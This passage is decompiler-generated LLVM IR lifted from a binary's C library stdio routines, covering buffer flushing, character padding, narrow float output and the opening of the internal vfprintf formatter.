  store i32 %v1_100085e811, i32* %r30.global-to-local, align 4
  br i1 %v3_100085e49, label %dec_label_pc_100085f4, label %dec_label_pc_100085a8

dec_label_pc_100085a8:                            ; preds = %entry, %dec_label_pc_100085d4
  %v0_100085a8 = call i32 @__pthread_return_0()
  %v3_100085ac = icmp eq i32 %v0_100085a8, 0
  %v0_100085b0 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100085b0, i32* @r3, align 4
  br i1 %v3_100085ac, label %dec_label_pc_100085d4, label %dec_label_pc_100085b8

dec_label_pc_100085b8:                            ; preds = %dec_label_pc_100085a8
  %v0_100085b8 = load i32, i32* %r31.global-to-local, align 4
  %v1_100085b8 = add i32 %v0_100085b8, 8
  %v2_100085b8 = inttoptr i32 %v1_100085b8 to i32*
  %v3_100085b8 = load i32, i32* %v2_100085b8, align 4
  store i32 %v3_100085b8, i32* %r9.global-to-local, align 4
  %v3_100085c0 = inttoptr i32 %v0_100085b8 to i16*
  store i16 48, i16* %v3_100085c0, align 2
  %v0_100085c4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100085c4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100085c4 = add i32 %v1_100085c4, 20
  %v3_100085c4 = inttoptr i32 %v2_100085c4 to i32*
  store i32 %v0_100085c4, i32* %v3_100085c4, align 4
  %v0_100085c8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100085c8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100085c8 = add i32 %v1_100085c8, 24
  %v3_100085c8 = inttoptr i32 %v2_100085c8 to i32*
  store i32 %v0_100085c8, i32* %v3_100085c8, align 4
  %v0_100085cc = load i32, i32* %r9.global-to-local, align 4
  %v1_100085cc = load i32, i32* %r31.global-to-local, align 4
  %v2_100085cc = add i32 %v1_100085cc, 28
  %v3_100085cc = inttoptr i32 %v2_100085cc to i32*
  store i32 %v0_100085cc, i32* %v3_100085cc, align 4
  %v0_100085d0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100085d0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100085d0 = add i32 %v1_100085d0, 16
  %v3_100085d0 = inttoptr i32 %v2_100085d0 to i32*
  store i32 %v0_100085d0, i32* %v3_100085d0, align 4
  br label %dec_label_pc_100085d4

dec_label_pc_100085d4:                            ; preds = %dec_label_pc_100085a8, %dec_label_pc_100085b8
  %v1_100085d8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100085d8 = add i32 %v1_100085d8, 52
  %v3_100085d8 = inttoptr i32 %v2_100085d8 to i32*
  store i32 1, i32* %v3_100085d8, align 4
  store i32 268469728, i32* @lr, align 4
  %v0_100085dc = call i32 @__stdio_init_mutex()
  %v0_100085e0 = load i32, i32* %r31.global-to-local, align 4
  %v1_100085e0 = add i32 %v0_100085e0, 32
  %v2_100085e0 = inttoptr i32 %v1_100085e0 to i32*
  %storemerge = load i32, i32* %v2_100085e0, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_100085e4 = icmp eq i32 %storemerge, 0
  %v1_100085e8 = add i32 %storemerge, 56
  store i32 %v1_100085e8, i32* %r30.global-to-local, align 4
  br i1 %v3_100085e4, label %dec_label_pc_100085e4.dec_label_pc_100085f4_crit_edge, label %dec_label_pc_100085a8

dec_label_pc_100085e4.dec_label_pc_100085f4_crit_edge: ; preds = %dec_label_pc_100085d4
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_10024a08.569 to i32*), align 4
  br label %dec_label_pc_100085f4

dec_label_pc_100085f4:                            ; preds = %dec_label_pc_100085e4.dec_label_pc_100085f4_crit_edge, %entry
  %v0_1000863016 = phi i32 [ %v1_100085e8, %dec_label_pc_100085e4.dec_label_pc_100085f4_crit_edge ], [ %v1_100085e811, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_100085e4.dec_label_pc_100085f4_crit_edge ], [ 0, %entry ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_100086185 = icmp eq i32 %storemerge12, 0
  br i1 %v3_100086185, label %dec_label_pc_10008620, label %dec_label_pc_10008600

dec_label_pc_10008600:                            ; preds = %dec_label_pc_100085f4, %dec_label_pc_10008614
  %v0_10008600 = phi i32 [ %storemerge1, %dec_label_pc_10008614 ], [ %storemerge12, %dec_label_pc_100085f4 ]
  %v1_10008600 = inttoptr i32 %v0_10008600 to i16*
  %v2_10008600 = load i16, i16* %v1_10008600, align 2
  %v3_10008600 = zext i16 %v2_10008600 to i32
  store i32 %v0_10008600, i32* @r3, align 4
  %v1_10008608 = and i32 %v3_10008600, 64
  store i32 %v1_10008608, i32* %r9.global-to-local, align 4
  %v3_10008608 = icmp eq i32 %v1_10008608, 0
  br i1 %v3_10008608, label %dec_label_pc_10008614, label %dec_label_pc_10008610

dec_label_pc_10008610:                            ; preds = %dec_label_pc_10008600
  store i32 268469780, i32* @lr, align 4
  %v0_10008610 = call i32 @__stdio_wcommit()
  %v0_10008614.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008614

dec_label_pc_10008614:                            ; preds = %dec_label_pc_10008600, %dec_label_pc_10008610
  %v0_10008614 = phi i32 [ %v0_10008600, %dec_label_pc_10008600 ], [ %v0_10008614.pre, %dec_label_pc_10008610 ]
  %v0_1000863017 = phi i32 [ %v0_10008600, %dec_label_pc_10008600 ], [ %v0_10008610, %dec_label_pc_10008610 ]
  %v1_10008614 = add i32 %v0_10008614, 32
  %v2_10008614 = inttoptr i32 %v1_10008614 to i32*
  %storemerge1 = load i32, i32* %v2_10008614, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_10008618 = icmp eq i32 %storemerge1, 0
  br i1 %v3_10008618, label %dec_label_pc_10008620, label %dec_label_pc_10008600

dec_label_pc_10008620:                            ; preds = %dec_label_pc_10008614, %dec_label_pc_100085f4
  %v0_10008630 = phi i32 [ %v0_1000863016, %dec_label_pc_100085f4 ], [ %v0_1000863017, %dec_label_pc_10008614 ]
  ret i32 %v0_10008630

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_10008600, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32* %r31.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r30.global-to-local, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_init_mutex, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_10008614, { 1, 0 }
  uselistorder label %dec_label_pc_10008600, { 1, 0 }
  uselistorder label %dec_label_pc_100085d4, { 1, 0 }
  uselistorder label %dec_label_pc_100085a8, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %v0_1000863c = load i32, i32* @r31, align 4
  %v0_10008640 = load i32, i32* @r3, align 4
  %v1_10008648 = add i32 %v0_10008640, 8
  %v2_10008648 = inttoptr i32 %v1_10008648 to i32*
  %v3_10008648 = load i32, i32* %v2_10008648, align 4
  %v1_1000864c = add i32 %v0_10008640, 16
  %v2_1000864c = inttoptr i32 %v1_1000864c to i32*
  %v3_1000864c = load i32, i32* %v2_1000864c, align 4
  %v2_10008654 = sub i32 %v3_1000864c, %v3_10008648
  store i32 %v2_10008654, i32* @r5, align 4
  %v5_10008654 = icmp eq i32 %v2_10008654, 0
  br i1 %v5_10008654, label %dec_label_pc_10008664, label %dec_label_pc_1000865c

dec_label_pc_1000865c:                            ; preds = %entry
  store i32 %v3_10008648, i32* %v2_1000864c, align 4
  store i32 268469860, i32* @lr, align 4
  %v2_10008660 = inttoptr i32 %v3_10008648 to i16*
  %v3_10008660 = call i32 @__stdio_WRITE(i16* %v2_10008660, i32 %v2_10008654)
  %v0_10008664.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008664

dec_label_pc_10008664:                            ; preds = %entry, %dec_label_pc_1000865c
  %v0_10008664 = phi i32 [ %v0_10008640, %entry ], [ %v0_10008664.pre, %dec_label_pc_1000865c ]
  %v1_10008664 = add i32 %v0_10008664, 8
  %v2_10008664 = inttoptr i32 %v1_10008664 to i32*
  %v3_10008664 = load i32, i32* %v2_10008664, align 4
  %v1_10008668 = add i32 %v0_10008664, 16
  %v2_10008668 = inttoptr i32 %v1_10008668 to i32*
  %v3_10008668 = load i32, i32* %v2_10008668, align 4
  store i32 %v0_1000863c, i32* @r31, align 4
  %v2_10008670 = sub i32 %v3_10008668, %v3_10008664
  ret i32 %v2_10008670

; uselistorder directives
  uselistorder i32 %v0_10008664, { 1, 0 }
  uselistorder i32 %v3_10008648, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008664, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_100086ac3 = icmp eq i32 %arg3, 0
  %v2_100086b0 = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_100086ac3, label %dec_label_pc_100086cc, label %dec_label_pc_100086c0

dec_label_pc_100086a8:                            ; preds = %dec_label_pc_100086c0
  %v1_100086a8 = add i32 %v0_100086a8, -1
  store i32 %v1_100086a8, i32* @r31, align 4
  %v3_100086ac = icmp eq i32 %v1_100086a8, 0
  %v0_100086b8 = load i32, i32* @r29, align 4
  br i1 %v3_100086ac, label %dec_label_pc_100086cc.loopexit, label %dec_label_pc_100086c0

dec_label_pc_100086c0:                            ; preds = %entry, %dec_label_pc_100086a8
  %v0_100086b85 = phi i32 [ %v0_100086b8, %dec_label_pc_100086a8 ], [ %arg1, %entry ]
  store i32 268469956, i32* @lr, align 4
  %v3_100086c0 = inttoptr i32 %v0_100086b85 to i16*
  %v4_100086c0 = call i32 @__stdio_fwrite(i32 %v2_100086b0, i32 1, i16* %v3_100086c0)
  %v3_100086c4 = icmp eq i32 %v4_100086c0, 1
  %v0_100086a8 = load i32, i32* @r31, align 4
  br i1 %v3_100086c4, label %dec_label_pc_100086a8, label %dec_label_pc_100086cc.loopexit

dec_label_pc_100086cc.loopexit:                   ; preds = %dec_label_pc_100086a8, %dec_label_pc_100086c0
  %v0_100086d0.ph = phi i32 [ %v0_100086a8, %dec_label_pc_100086c0 ], [ 0, %dec_label_pc_100086a8 ]
  %v1_100086d0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100086cc

dec_label_pc_100086cc:                            ; preds = %dec_label_pc_100086cc.loopexit, %entry
  %v1_100086d0 = phi i32 [ 0, %entry ], [ %v1_100086d0.pre, %dec_label_pc_100086cc.loopexit ]
  %v0_100086d0 = phi i32 [ 0, %entry ], [ %v0_100086d0.ph, %dec_label_pc_100086cc.loopexit ]
  %v2_100086d0 = sub i32 %v1_100086d0, %v0_100086d0
  ret i32 %v2_100086d0

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100086cc.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_100086c0, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  %v1_100086f8 = and i32 %arg2, 128
  %v3_100086f8 = icmp eq i32 %v1_100086f8, 0
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_100086f8, label %dec_label_pc_10008748, label %dec_label_pc_10008714

dec_label_pc_10008714:                            ; preds = %entry
  %v0_10008714 = call i32 @__GI_strlen()
  %v0_10008718 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10008714, i32* @r31, align 4
  %v0_10008720 = load i32, i32* %r26.global-to-local, align 4
  %v1_10008724 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008724 = sub i32 %v1_10008724, %v0_10008714
  store i32 %v2_10008724, i32* %r29.global-to-local, align 4
  store i32 %v0_10008714, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_10008724, 1
  br i1 %tmp7, label %dec_label_pc_10008748, label %dec_label_pc_10008734

dec_label_pc_10008734:                            ; preds = %dec_label_pc_10008714
  %v1_10008718 = urem i32 %v0_10008718, 128
  store i32 268470072, i32* @lr, align 4
  %v3_10008734 = trunc i32 %v1_10008718 to i8
  %v4_10008734 = call i32 @_charpad(i32 %v0_10008720, i8 %v3_10008734, i32 %v2_10008724)
  %v0_10008738 = load i32, i32* @r31, align 4
  store i32 %v0_10008738, i32* %r30.global-to-local, align 4
  %v1_1000873c = load i32, i32* @r29, align 4
  %v4_1000873c = icmp eq i32 %v4_10008734, %v1_1000873c
  store i32 %v4_10008734, i32* @r28, align 4
  br i1 %v4_1000873c, label %dec_label_pc_10008734.dec_label_pc_10008748_crit_edge, label %dec_label_pc_1000876c

dec_label_pc_10008734.dec_label_pc_10008748_crit_edge: ; preds = %dec_label_pc_10008734
  %v0_10008754.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10008748

dec_label_pc_10008748:                            ; preds = %dec_label_pc_10008734.dec_label_pc_10008748_crit_edge, %dec_label_pc_10008714, %entry
  %v0_10008754 = phi i32 [ %v0_10008754.pre, %dec_label_pc_10008734.dec_label_pc_10008748_crit_edge ], [ %v0_10008720, %dec_label_pc_10008714 ], [ %arg1, %entry ]
  %v0_10008750 = phi i32 [ %v0_10008738, %dec_label_pc_10008734.dec_label_pc_10008748_crit_edge ], [ %v0_10008714, %dec_label_pc_10008714 ], [ %arg3, %entry ]
  %tmp8 = icmp slt i32 %v0_10008750, 1
  br i1 %tmp8, label %dec_label_pc_10008768, label %dec_label_pc_10008760

dec_label_pc_10008760:                            ; preds = %dec_label_pc_10008748
  %v0_1000874c = load i32, i32* @r27, align 4
  store i32 268470116, i32* @lr, align 4
  %v3_10008760 = inttoptr i32 %v0_10008754 to i16*
  %v4_10008760 = call i32 @__stdio_fwrite(i32 %v0_1000874c, i32 %v0_10008750, i16* %v3_10008760)
  br label %dec_label_pc_10008768

dec_label_pc_10008768:                            ; preds = %dec_label_pc_10008748, %dec_label_pc_10008760
  %v1_10008768 = phi i32 [ 0, %dec_label_pc_10008748 ], [ %v4_10008760, %dec_label_pc_10008760 ]
  %v0_10008768 = load i32, i32* @r28, align 4
  %v2_10008768 = add i32 %v0_10008768, %v1_10008768
  br label %dec_label_pc_1000876c

dec_label_pc_1000876c:                            ; preds = %dec_label_pc_10008734, %dec_label_pc_10008768
  %v0_10008770 = phi i32 [ %v4_10008734, %dec_label_pc_10008734 ], [ %v2_10008768, %dec_label_pc_10008768 ]
  ret i32 %v0_10008770

; uselistorder directives
  uselistorder i32 %v0_10008750, { 1, 0 }
  uselistorder i32 %v2_10008724, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_1000876c, { 1, 0 }
  uselistorder label %dec_label_pc_10008768, { 1, 0 }
}

define i32 @_vfprintf_internal() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_3()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_3()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_10008788 = load i32, i32* @lr, align 4
  store i32 %v0_10008788, i32* %r0.global-to-local, align 4
  %v2_10008790 = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_10008790, i32* %r30.global-to-local, align 4
  %v0_10008794 = load i32, i32* @r3, align 4
  store i32 %v0_10008794, i32* %r24.global-to-local, align 4
  %v0_100087a0 = load i32, i32* @r5, align 4
  store i32 %v0_100087a0, i32* %r31.global-to-local, align 4
  %v0_100087a4 = load i32, i32* @r4, align 4
  store i32 %v0_100087a4, i32* @r29, align 4
  store i32 268470188, i32* @lr, align 4
  %v1_100087a8 = bitcast i8** %stack_var_-200 to i32*
  %v2_100087a8 = call i32 @_ppfs_init(i32* %v1_100087a8)
  %tmp72 = icmp sgt i32 %v2_100087a8, -1
  br i1 %tmp72, label %dec_label_pc_100087dc, label %dec_label_pc_100087b4

dec_label_pc_100087b4:                            ; preds = %entry
  %v3_100087b4 = load i8*, i8** %stack_var_-200, align 4
  %v4_100087b4 = ptrtoint i8* %v3_100087b4 to i32
  store i32 %v4_100087b4, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_100087b4, i32* @r3, align 4
  %v0_100087c0 = call i32 @__GI_strlen()
  %v3_100087c4 = icmp eq i32 %v0_100087c0, 0
  br i1 %v3_100087c4, label %dec_label_pc_10008ddc, label %dec_label_pc_100087cc

dec_label_pc_100087cc:                            ; preds = %dec_label_pc_100087b4
  %v0_100087cc = load i32, i32* @r31, align 4
  %v0_100087d0 = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100087d8.574 to i32), i32* @lr, align 4
  %v3_100087d4 = inttoptr i32 %v0_100087d0 to i16*
  %v4_100087d4 = call i32 @__stdio_fwrite(i32 %v0_100087cc, i32 %v0_100087c0, i16* %v3_100087d4)
  br label %dec_label_pc_10008ddc

dec_label_pc_100087dc:                            ; preds = %entry
  %v0_100087e0 = load i32, i32* @r31, align 4
  store i32 268470248, i32* @lr, align 4
  %v2_100087e4 = call i32 @_ppfs_prepargs(i32 %v2_10008790, i32 %v0_100087e0)
  store i32 0, i32* %r23.global-to-local, align 4
  %v4_1000887c = zext i8 %tmp59 to i32
  %v2_10008880 = icmp sgt i32 %tmp60, 0
  %v2_10008884 = ptrtoint i32* %stack_var_-112 to i32
  %v2_100088a8 = ptrtoint i32* %stack_var_-344 to i32
  %v3_100088ac = icmp eq i32 %tmp58, 0
  %tmp73 = icmp sgt i32 %tmp58, -1
  %v3_100088e0 = icmp eq i32 %tmp57, 0
  %v2_10008c3c = ptrtoint i32* %stack_var_-328 to i32
  %v2_10008b5c = ptrtoint i32* %stack_var_-340 to i32
  %v2_10008b60 = ptrtoint i32* %stack_var_-336 to i32
  %v5_100089d4 = bitcast i32* %stack_var_-201 to i8*
  %tmp74 = icmp ult i32 %tmp57, 6
  %v3_10008ab0 = icmp eq i32 %tmp57, 1
  %v2_10008a54 = icmp ugt i32 %tmp57, 2
  %v4_10008994 = zext i8 %tmp55 to i32
  %v0_10008dc8.pre = load i32, i32* @r29, align 4
  %v1_10008894 = mul nuw nsw i32 %v4_1000887c, 8
  %v2_10008898 = add i32 %v2_10008884, %v1_10008894
  %v1_1000889c = add i32 %v2_10008898, -8
  %v1_100088b0 = add i32 %tmp58, 1
  %v2_10008908 = icmp ugt i32 %tmp57, 7
  %v2_10008ae8 = icmp ugt i32 %tmp57, 15
  %v2_10008b1c = icmp ugt i32 %tmp57, 17
  %v3_10008b1c = icmp eq i32 %tmp57, 17
  %v2_10008bc4 = icmp ugt i32 %tmp57, 19
  %v3_10008bc4 = icmp eq i32 %tmp57, 19
  %v3_10008c30 = icmp eq i32 %tmp57, 20
  %v1_10008920 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_100128fc.576 to i32), i32 -1)
  %v2_10008920 = inttoptr i32 %v1_10008920 to i8*
  %v3_10008a60 = icmp eq i32 %tmp57, 3
  %v3_10008a70 = icmp eq i32 %tmp57, 4
  br label %dec_label_pc_10008dc8

dec_label_pc_100087f4.backedge:                   ; preds = %dec_label_pc_10008848, %dec_label_pc_10008800
  %storemerge13.in = phi i32 [ %v1_10008810, %dec_label_pc_10008800 ], [ %v1_10008848, %dec_label_pc_10008848 ]
  %v1_1000880816 = phi i32 [ %v0_10008820, %dec_label_pc_10008800 ], [ %v1_10008848, %dec_label_pc_10008848 ]
  %storemerge13 = add i32 %storemerge13.in, 1
  store i32 %storemerge13, i32* @r29, align 4
  br label %dec_label_pc_100087f4

dec_label_pc_100087f4:                            ; preds = %dec_label_pc_100087f4.backedge, %dec_label_pc_10008dc8
  %v0_10008820 = phi i32 [ %v1_1000880816, %dec_label_pc_100087f4.backedge ], [ %v0_10008dc8, %dec_label_pc_10008dc8 ]
  %v1_10008810 = phi i32 [ %storemerge13, %dec_label_pc_100087f4.backedge ], [ %v0_10008dc8, %dec_label_pc_10008dc8 ]
  %v1_100087f4 = inttoptr i32 %v1_10008810 to i8*
  %v2_100087f4 = load i8, i8* %v1_100087f4, align 1
  %v3_100087f4 = zext i8 %v2_100087f4 to i32
  store i32 %v3_100087f4, i32* %r0.global-to-local, align 4
  %v3_100087f8 = icmp eq i8 %v2_100087f4, 0
  br i1 %v3_100087f8, label %dec_label_pc_10008808, label %dec_label_pc_10008800

dec_label_pc_10008800:                            ; preds = %dec_label_pc_100087f4
  %v3_10008800 = icmp eq i8 %v2_100087f4, 37
  br i1 %v3_10008800, label %dec_label_pc_10008808, label %dec_label_pc_100087f4.backedge

dec_label_pc_10008808:                            ; preds = %dec_label_pc_10008800, %dec_label_pc_100087f4
  %v4_10008808 = icmp eq i32 %v1_10008810, %v0_10008820
  br i1 %v4_10008808, label %dec_label_pc_1000883c, label %dec_label_pc_10008810

dec_label_pc_10008810:                            ; preds = %dec_label_pc_10008808
  %v2_10008810 = sub i32 %v1_10008810, %v0_10008820
  store i32 %v2_10008810, i32* @r31, align 4
  %v4_10008810 = icmp sgt i32 %v2_10008810, 0
  br i1 %v4_10008810, label %dec_label_pc_10008820, label %dec_label_pc_10008830

dec_label_pc_10008820:                            ; preds = %dec_label_pc_10008810
  %v0_10008828 = load i32, i32* %r24.global-to-local, align 4
  store i32 268470320, i32* @lr, align 4
  %v3_1000882c = inttoptr i32 %v0_10008828 to i16*
  %v4_1000882c = call i32 @__stdio_fwrite(i32 %v0_10008820, i32 %v2_10008810, i16* %v3_1000882c)
  %v1_10008830.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008830

dec_label_pc_10008830:                            ; preds = %dec_label_pc_10008810, %dec_label_pc_10008820
  %v1_10008838 = phi i32 [ %v1_10008830.pre, %dec_label_pc_10008820 ], [ %v2_10008810, %dec_label_pc_10008810 ]
  %storemerge2 = phi i32 [ %v4_1000882c, %dec_label_pc_10008820 ], [ 0, %dec_label_pc_10008810 ]
  %v4_10008830 = icmp eq i32 %storemerge2, %v1_10008838
  br i1 %v4_10008830, label %dec_label_pc_10008838, label %dec_label_pc_10008dd8

dec_label_pc_10008838:                            ; preds = %dec_label_pc_10008830
  %v0_10008838 = load i32, i32* %r23.global-to-local, align 4
  %v2_10008838 = add i32 %v0_10008838, %v1_10008838
  store i32 %v2_10008838, i32* %r23.global-to-local, align 4
  %v0_1000883c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000883c

dec_label_pc_1000883c:                            ; preds = %dec_label_pc_10008808, %dec_label_pc_10008838
  %v0_10008848 = phi i32 [ %v0_10008820, %dec_label_pc_10008808 ], [ %v0_1000883c.pre, %dec_label_pc_10008838 ]
  %v1_1000883c = inttoptr i32 %v0_10008848 to i8*
  %v2_1000883c = load i8, i8* %v1_1000883c, align 1
  %v3_1000883c = zext i8 %v2_1000883c to i32
  store i32 %v3_1000883c, i32* %r0.global-to-local, align 4
  %v3_10008840 = icmp eq i8 %v2_1000883c, 0
  br i1 %v3_10008840, label %dec_label_pc_10008ddc, label %dec_label_pc_10008848

dec_label_pc_10008848:                            ; preds = %dec_label_pc_1000883c
  %v1_10008848 = add i32 %v0_10008848, 1
  %v2_10008848 = inttoptr i32 %v1_10008848 to i8*
  %v3_10008848 = load i8, i8* %v2_10008848, align 1
  %v4_10008848 = zext i8 %v3_10008848 to i32
  store i32 %v4_10008848, i32* %r0.global-to-local, align 4
  %v3_10008850 = icmp eq i8 %v3_10008848, 37
  br i1 %v3_10008850, label %dec_label_pc_100087f4.backedge, label %dec_label_pc_10008858

dec_label_pc_10008858:                            ; preds = %dec_label_pc_10008848
  store i32 %v2_10008790, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_10008848, i8** %stack_var_-200, align 4
  store i32 268470384, i32* @lr, align 4
  %v3_1000886c = call i32 @_ppfs_parsespec(i32* %v1_100087a8, i32 %v1_10008848)
  store i32 %v2_10008790, i32* @r3, align 4
  store i32 268470392, i32* @lr, align 4
  %v0_10008874 = call i32 @_ppfs_setargs()
  store i32 %v4_1000887c, i32* @r7, align 4
  store i32 %v2_10008884, i32* %r0.global-to-local, align 4
  br i1 %v2_10008880, label %dec_label_pc_10008894, label %dec_label_pc_100088a0

dec_label_pc_10008894:                            ; preds = %dec_label_pc_10008858
  br label %dec_label_pc_100088a0

dec_label_pc_100088a0:                            ; preds = %dec_label_pc_10008858, %dec_label_pc_10008894
  %v0_100088cc82 = phi i32 [ %v1_1000889c, %dec_label_pc_10008894 ], [ %v2_10008884, %dec_label_pc_10008858 ]
  store i32 %v0_100088cc82, i32* %r10.global-to-local, align 4
  store i32 %v2_100088a8, i32* @r8, align 4
  store i32 %v1_100088b0, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_100088d0.preheader, label %dec_label_pc_100088d0.preheader.thread

dec_label_pc_100088d0.preheader.thread:           ; preds = %dec_label_pc_100088a0
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100088dc

dec_label_pc_100088d0.preheader:                  ; preds = %dec_label_pc_100088a0
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_100088ac, label %dec_label_pc_100088dc, label %dec_label_pc_100088c8.preheader

dec_label_pc_100088c8.preheader:                  ; preds = %dec_label_pc_100088d0.preheader
  store i32 %v0_100088cc82, i32* %stack_var_-344, align 4
  %v1_100088cc83 = add i32 %v0_100088cc82, 8
  store i32 %v1_100088cc83, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_100088d888 = add i32 %tmp58, -1
  store i32 %v1_100088d888, i32* %ctr.global-to-local, align 4
  %v2_100088d889 = icmp eq i32 %v1_100088d888, 0
  br i1 %v2_100088d889, label %dec_label_pc_100088dc, label %dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge

dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge: ; preds = %dec_label_pc_100088c8.preheader, %dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge.dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge_crit_edge
  %v1_100088c8.pre = phi i32 [ %v1_100088c8.pre.pre, %dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge.dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge_crit_edge ], [ %v2_100088a8, %dec_label_pc_100088c8.preheader ]
  %v1_100088d091 = phi i32 [ %v1_100088d0, %dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge.dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge_crit_edge ], [ 4, %dec_label_pc_100088c8.preheader ]
  %v1_100088cc90 = phi i32 [ %v1_100088cc, %dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge.dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge_crit_edge ], [ %v1_100088cc83, %dec_label_pc_100088c8.preheader ]
  %v3_100088c8 = add i32 %v1_100088c8.pre, %v1_100088d091
  %v4_100088c8 = inttoptr i32 %v3_100088c8 to i32*
  store i32 %v1_100088cc90, i32* %v4_100088c8, align 4
  %v0_100088cc = load i32, i32* %r10.global-to-local, align 4
  %v1_100088cc = add i32 %v0_100088cc, 8
  store i32 %v1_100088cc, i32* %r10.global-to-local, align 4
  %v0_100088d0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100088d0 = mul i32 %v0_100088d0, 4
  store i32 %v1_100088d0, i32* %r0.global-to-local, align 4
  %v1_100088d4 = add i32 %v0_100088d0, 1
  store i32 %v1_100088d4, i32* %r11.global-to-local, align 4
  %v0_100088d8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100088d8 = add i32 %v0_100088d8, -1
  store i32 %v1_100088d8, i32* %ctr.global-to-local, align 4
  %v2_100088d8 = icmp eq i32 %v1_100088d8, 0
  br i1 %v2_100088d8, label %dec_label_pc_100088dc, label %dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge.dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge_crit_edge

